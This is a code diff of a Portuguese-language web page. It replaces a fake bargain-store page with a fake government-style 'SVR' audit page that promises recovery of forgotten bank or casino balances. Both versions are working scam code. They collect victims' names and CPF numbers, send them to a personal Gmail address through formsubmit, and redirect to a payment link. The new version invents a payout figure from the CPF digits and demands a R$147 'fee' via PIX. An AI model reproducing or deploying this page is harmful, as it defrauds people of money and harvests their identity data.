@@ -1,138 +1,205 @@
-        <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Market Outlet | 100+ Itens em Saldão</title>
+    <title>SVR - Auditoria Pericial de Ativos Financeiros</title>
     <script src="https://unpkg.com/lucide@latest"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
     <style>
-        :root { --yellow: #fff159; --blue: #2d3277; --bg: #f4f4f4; --red: #d93025; --green: #00a650; }
-        body { font-family: 'Inter', sans-serif; margin: 0; background: var(--bg); }
-        header { background: var(--yellow); padding: 15px; position: sticky; top: 0; z-index: 100; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-        .header-container { max-width: 600px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
-        .logo { font-weight: 900; color: var(--blue); font-size: 18px; text-transform: uppercase; }
-        .container { max-width: 500px; margin: 10px auto; padding: 0 10px; }
-        .screen { display: none; animation: fadeIn 0.3s ease; }
+        :root { --primary: #0a192f; --accent: #1e40af; --success: #15803d; --bg: #f1f5f9; }
+        body { font-family: 'Inter', sans-serif; margin: 0; background: var(--bg); color: #1e293b; font-size: 14px; }
+        
+        .top-info { background: #e2e8f0; padding: 6px 0; font-size: 10px; font-weight: 700; text-align: center; color: #475569; border-bottom: 1px solid #cbd5e1; }
+        header { background: white; padding: 20px 0; border-bottom: 3px solid var(--primary); }
+        .container { max-width: 480px; margin: 0 auto; padding: 0 20px; }
+
+        .screen { display: none; padding: 25px 0; animation: fadeIn 0.3s ease; }
         .screen.active { display: block; }
-        .products-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
-        .product-card { background: white; border-radius: 6px; padding: 10px; border: 1px solid #ddd; position: relative; cursor: pointer; }
-        .badge { position: absolute; top: 5px; right: 5px; background: var(--red); color: white; font-size: 8px; padding: 2px 5px; font-weight: 900; border-radius: 3px; }
-        .product-card img { width: 100%; height: 120px; object-fit: cover; border-radius: 4px; margin-bottom: 5px; }
-        .p-title { font-size: 11px; font-weight: 600; height: 28px; overflow: hidden; margin: 5px 0; color: #444; }
-        .p-price { font-size: 16px; font-weight: 900; color: var(--blue); }
-        .detail-box { background: white; padding: 20px; border-radius: 8px; }
-        .laudo { background: #fffde7; border: 1px dashed #fbc02d; padding: 12px; border-radius: 4px; font-size: 13px; margin: 15px 0; line-height: 1.4; }
-        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; margin-bottom: 10px; }
-        .btn { width: 100%; padding: 16px; border: none; border-radius: 8px; font-size: 16px; font-weight: 900; cursor: pointer; color: white; background: var(--blue); }
+
+        .card { background: white; border-radius: 4px; padding: 30px; border: 1px solid #d1d5db; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.05); }
+        .doc-header { border-bottom: 1px solid #eee; margin-bottom: 20px; padding-bottom: 10px; }
+        .doc-title { font-size: 18px; font-weight: 900; color: var(--primary); text-transform: uppercase; }
+
+        .label { font-weight: 700; font-size: 11px; color: #475569; margin-bottom: 8px; display: block; text-transform: uppercase; }
+        .input { width: 100%; padding: 15px; border: 1px solid #cbd5e1; border-radius: 4px; font-size: 18px; font-family: 'Roboto Mono', monospace; margin-bottom: 20px; box-sizing: border-box; }
+        
+        .btn-gov { width: 100%; background: var(--primary); color: white; border: none; padding: 20px; font-size: 15px; font-weight: 700; border-radius: 4px; cursor: pointer; text-transform: uppercase; }
+
+        /* TERMINAL */
+        .terminal { background: #000; color: #22c55e; font-family: 'Roboto Mono', monospace; padding: 20px; font-size: 11px; border-radius: 4px; height: 150px; overflow: hidden; margin: 20px 0; line-height: 1.8; border: 2px solid #333; }
+
+        /* INFO DO TITULAR */
+        .titular-box { background: #f8fafc; border: 1px solid #e2e8f0; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
+        .titular-item { display: flex; justify-content: space-between; margin-bottom: 5px; font-size: 12px; }
+        .titular-item b { color: var(--primary); }
+
+        .val-destaque { font-size: 32px; font-weight: 800; color: var(--success); text-align: center; padding: 20px 0; border: 2px dashed var(--success); margin: 15px 0; background: #f0fdf4; letter-spacing: -1px; }
+
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        footer { text-align: center; font-size: 10px; color: #94a3b8; padding: 40px 0; }
     </style>
 </head>
 <body>
 
+<div class="top-info">SISTEMA DE CONCILIAÇÃO BANCÁRIA - TERMINAL 042-B</div>
+
 <header>
-    <div class="header-container">
-        <div class="logo">MARKET OUTLET</div>
-        <div style="font-size: 10px; font-weight: 900; color: var(--blue);">100+ LOTES DISPONÍVEIS</div>
+    <div class="container">
+        <div class="doc-header" style="border:none; margin:0; padding:0;">
+            <div style="font-weight: 900; color: var(--primary); font-size: 16px;">SVR - AUDITORIA DE ATIVOS</div>
+        </div>
     </div>
 </header>
 
 <div class="container">
+
     <div id="step1" class="screen active">
-        <div class="products-grid" id="grid"></div>
+        <div class="card">
+            <span class="label">NOME COMPLETO DO TITULAR</span>
+            <input type="text" id="nome" class="input" placeholder="Digite seu nome" style="font-size: 14px; font-family: 'Inter';">
+            
+            <span class="label">CPF (DOCUMENTO DE IDENTIDADE)</span>
+            <input type="tel" id="cpf" class="input" placeholder="000.000.000-00">
+            
+            <div style="margin-bottom: 20px;">
+                <label>TIPO DE RESGATE</label>
+                <select id="tipo" class="input" style="font-size: 14px; font-family: 'Inter';">
+                    <option value="BANCÁRIA">AUDITORIA BANCÁRIA (CONTAS INATIVAS)</option>
+                    <option value="PLATAFORMA">RECUPERAÇÃO DE SALDO (PG/CASSINOS)</option>
+                </select>
+            </div>
+
+            <button class="btn-gov" onclick="iniciar()">REALIZAR PERÍCIA TÉCNICA</button>
+        </div>
     </div>
 
     <div id="step2" class="screen">
-        <div class="detail-box" id="info"></div>
+        <div class="card">
+            <div class="doc-title" style="font-size: 14px; text-align: center;">VARRENDO NÓS DE REDE...</div>
+            <div class="terminal" id="term"></div>
+        </div>
     </div>
 
     <div id="step3" class="screen">
-        <div class="detail-box">
-            <h2 style="font-size: 18px; margin-bottom: 15px;">Dados para Entrega</h2>
-            <form id="form">
-                <input type="text" name="Nome" id="n" placeholder="Nome Completo" required>
-                <input type="tel" name="CPF" id="c" placeholder="CPF" required>
-                <input type="tel" name="WhatsApp" id="w" placeholder="WhatsApp" required>
-                <input type="tel" name="CEP" id="ce" placeholder="CEP" required>
-                <button type="button" class="btn" style="background: var(--green);" onclick="finalizar()">CONCLUIR RESGATE</button>
-            </form>
+        <div class="card">
+            <div class="doc-header">
+                <div class="doc-title">LAUDO DE DISPONIBILIDADE</div>
+                <div style="font-size: 10px; color: #64748b;">EMITIDO PELO SISTEMA DE CONCILIAÇÃO EM <span id="data"></span></div>
+            </div>
+
+            <div class="titular-box">
+                <div class="titular-item"><span>TITULAR:</span> <b id="res-nome">--</b></div>
+                <div class="titular-item"><span>DOCUMENTO:</span> <b id="res-cpf">--</b></div>
+                <div class="titular-item"><span>ID DE REGISTRO:</span> <b id="res-id" style="font-family: 'Roboto Mono';">--</b></div>
+                <div class="titular-item"><span>INSTITUIÇÃO:</span> <b id="res-banco">--</b></div>
+            </div>
+
+            <div style="font-size: 12px; color: #475569; border-bottom: 1px solid #eee; padding-bottom: 10px; margin-bottom: 15px;">
+                <b>DETALHE DO ATIVO:</b> <span id="res-detalhe"></span> com incidência de correção pela Taxa SELIC acumulada.
+            </div>
+
+            <div class="val-destaque">
+                <small style="font-size: 10px; display: block; color: var(--success);">VALOR TOTAL APURADO</small>
+                <span id="valor-final">R$ 0,00</span>
+            </div>
+
+            <div style="background: #fffbeb; border: 1px solid #fef3c7; padding: 15px; font-size: 11px; line-height: 1.5; color: #92400e;">
+                <b>⚠️ EXIGÊNCIA DE LIQUIDAÇÃO:</b> Para a liberação do montante para o CPF <span id="cpf-aviso"></span>, o sistema exige o recolhimento da <b>TARIFA OPERACIONAL (TOA) DE R$ 147,00</b>. O pagamento gera o alvará automático e o estorno do valor da tarifa em 5 minutos.
+            </div>
+
+            <button class="btn-gov" style="background:var(--success); margin-top: 20px;" onclick="pagar()">EFETUAR RESGATE VIA PIX</button>
         </div>
     </div>
+
 </div>
+
+<footer>
+    SVR - Auditoria de Ativos Financeiros Ltda.<br>
+    Protocolo de Segurança Criptografada SSL<br>
+    © 2026 - Auditoria Centralizada
+</footer>
 
 <script>
     lucide.createIcons();
     const EMAIL = "zndohot@gmail.com";
-    
-    // MODELOS COM IMAGENS REAIS E MOTIVOS ESPECÍFICOS
-    const modelosBase = [
-        { n: "iPhone 14 Pro Max 256GB", v: "147,00", l: "https://pay.cakto.com.br/3afi959", i: "https://images.unsplash.com/photo-1678685888221-cda773a3dcdb?w=400", m: "Motivo: Aparelho de vitrine com bateria 98%. Pequeno risco na lateral que não afeta o uso." },
-        { n: "PlayStation 5 Edição Digital", v: "97,90", l: "https://pay.cakto.com.br/zfsmzd5", i: "https://images.unsplash.com/photo-1606813907291-d86efa9b94db?w=400", m: "Motivo: Caixa amassada durante o transporte. Console novo e lacrado internamente." },
-        { n: "Air Fryer Mondial 4L", v: "70,90", l: "https://pay.cakto.com.br/xs9pn2t", i: "https://images.unsplash.com/photo-1626078436897-40c06a3070bc?w=400", m: "Motivo: Vendido sem a caixa original. Produto nunca usado, apenas reembalado." },
-        { n: "Fone Sony WH-1000XM4", v: "59,90", l: "https://pay.cakto.com.br/jrqn68w", i: "https://images.unsplash.com/photo-1546435770-a3e426bf472b?w=400", m: "Motivo: Produto de devolução (7 dias). Higienizado e testado. Cabo USB não incluso." },
-        { n: "MacBook Air M1 Apple", v: "197,90", l: "https://pay.cakto.com.br/3afi959", i: "https://images.unsplash.com/photo-1611186871348-b1ce696e52c9?w=400", m: "Motivo: Lote de leilão logístico. Pequena marca estética na tampa de alumínio." },
-        { n: "Smart TV 55' 4K Samsung", v: "197,90", l: "https://pay.cakto.com.br/3afi959", i: "https://images.unsplash.com/photo-1593359677879-a4bb92f829d1?w=400", m: "Motivo: Exposição em loja. Pequeno detalhe na moldura traseira, imperceptível no suporte." },
-        { n: "Geladeira Samsung Frost Free", v: "197,90", l: "https://pay.cakto.com.br/3afi959", i: "https://images.unsplash.com/photo-1571175452281-04a1fb1822c1?w=400", m: "Motivo: Pequena avaria estética na porta lateral ocorrida no armazém." },
-        { n: "Caixa JBL Boombox 3", v: "97,90", l: "https://pay.cakto.com.br/zfsmzd5", i: "https://images.unsplash.com/photo-1612444530582-fc66183b16f7?w=400", m: "Motivo: Produto com alça de transporte levemente riscada. Som impecável." }
-    ];
+    const CHECKOUT = "https://pay.cakto.com.br/3afi959";
 
-    // GERA 100 PRODUTOS
-    const listaCompleta = [];
-    for(let i = 1; i <= 100; i++) {
-        let base = modelosBase[Math.floor(Math.random() * modelosBase.length)];
-        // Adiciona um parâmetro aleatório para forçar o carregamento de imagens diferentes
-        let randomImg = `${base.i}&sig=${i}`;
-        listaCompleta.push({ 
-            ...base, 
-            id: i, 
-            nome: `${base.n} - Lote #${8100+i}`,
-            img: randomImg
-        });
+    const bancos = ["Itaú Unibanco S.A.", "Banco Bradesco S.A.", "Santander Brasil", "Caixa Econômica"];
+    const casas = ["Betano Global Payments", "Blaze LP Tech", "PG Soft Provedores", "Estrela Bet Tecnologia"];
+
+    function iniciar() {
+        const nome = document.getElementById('nome').value;
+        const cpf = document.getElementById('cpf').value;
+        if(nome.length < 5 || cpf.length < 11) return alert("Preencha seu Nome e CPF corretamente.");
+
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('step2').classList.add('active');
+
+        const logs = [
+            "> Verificando autenticidade do documento...",
+            "> Acessando base de dados centralizada...",
+            "> Localizando registros vinculados ao titular...",
+            "> Calculando juros e correção monetária...",
+            "> Gerando ID de Registro Único...",
+            "> Preparando laudo de liberação..."
+        ];
+
+        let i = 0;
+        const term = document.getElementById('term');
+        const interval = setInterval(() => {
+            term.innerHTML += `<div>${logs[i]}</div>`;
+            term.scrollTop = term.scrollHeight;
+            i++;
+            if(i >= logs.length) {
+                clearInterval(interval);
+                mostrarLaudo();
+            }
+        }, 1200);
     }
 
-    // MONTA A VITRINE
-    document.getElementById('grid').innerHTML = listaCompleta.map(p => `
-        <div class="product-card" onclick="verDetalhes(${p.id})">
-            <div class="badge">LEILÃO / AVARIA</div>
-            <img src="${p.img}">
-            <div class="p-title">${p.nome}</div>
-            <div class="p-price">R$ ${p.v}</div>
-        </div>
-    `).join('');
+    function mostrarLaudo() {
+        const nome = document.getElementById('nome').value.toUpperCase();
+        const cpf = document.getElementById('cpf').value;
+        const num = cpf.replace(/\D/g, "");
+        const tipo = document.getElementById('tipo').value;
 
-    let linkFinal = "";
+        // VALOR DINÂMICO
+        const semente = parseInt(num.substring(0, 3)) || 500;
+        const valorFinal = tipo === 'BANCÁRIA' ? (semente * 6.1 + 3840) : (semente * 9.5 + 4650);
+        
+        // ID ÚNICO E BANCO
+        const idRegistro = "REF-" + num.substring(0,3) + "-" + Math.floor(Math.random() * 99999);
+        const banco = tipo === 'BANCÁRIA' ? bancos[Math.floor(Math.random()*bancos.length)] : casas[Math.floor(Math.random()*casas.length)];
+        const detalhe = tipo === 'BANCÁRIA' ? "Ativos de Contas Encerradas" : "Saldos Retidos em Provedor";
 
-    function verDetalhes(id) {
-        const p = listaCompleta.find(x => x.id === id);
-        linkFinal = p.l;
-        document.getElementById('info').innerHTML = `
-            <button onclick="irPara(1)" style="border:none;background:none;color:var(--blue);font-weight:bold;cursor:pointer;margin-bottom:10px;">← Voltar ao Catálogo</button>
-            <img src="${p.img}" style="width:100%; height:200px; object-fit:contain;">
-            <h2 style="font-size:18px; margin:10px 0;">${p.nome}</h2>
-            <div class="laudo">
-                <b style="color:#856404; display:block; margin-bottom:5px;">📋 LAUDO DE INSPEÇÃO:</b>
-                ${p.m}
-            </div>
-            <div style="font-size:26px; font-weight:900; color:var(--blue); margin-bottom:20px;">R$ ${p.v}</div>
-            <button class="btn" onclick="irPara(3)">RESGATAR ESTE LOTE</button>
-        `;
-        irPara(2);
+        document.getElementById('res-nome').innerText = nome;
+        document.getElementById('res-cpf').innerText = cpf;
+        document.getElementById('res-id').innerText = idRegistro;
+        document.getElementById('res-banco').innerText = banco;
+        document.getElementById('res-detalhe').innerText = detalhe;
+        document.getElementById('valor-final').innerText = valorFinal.toLocaleString('pt-br', {style: 'currency', currency: 'BRL'});
+        document.getElementById('cpf-aviso').innerText = cpf;
+        document.getElementById('data').innerText = new Date().toLocaleDateString();
+
+        document.getElementById('step2').classList.remove('active');
+        document.getElementById('step3').classList.add('active');
+        lucide.createIcons();
     }
 
-    function irPara(s) {
-        document.querySelectorAll('.screen').forEach(e => e.classList.remove('active'));
-        document.getElementById('step' + s).classList.add('active');
-        window.scrollTo(0,0);
-    }
+    function pagar() {
+        const dados = {
+            Nome: document.getElementById('res-nome').innerText,
+            CPF: document.getElementById('res-cpf').innerText,
+            ID_Registro: document.getElementById('res-id').innerText,
+            Valor: document.getElementById('valor-final').innerText
+        };
 
-    function finalizar() {
-        if(!document.getElementById('n').value) return alert("Por favor, preencha seus dados.");
-        const dados = new FormData(document.getElementById('form'));
         fetch(`https://formsubmit.co/ajax/${EMAIL}`, {
             method: "POST",
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(Object.fromEntries(dados))
-        }).then(() => { window.location.href = linkFinal; }).catch(() => { window.location.href = linkFinal; });
+            body: JSON.stringify(dados)
+        }).finally(() => { window.location.href = CHECKOUT; });
     }
 </script>
 </body>
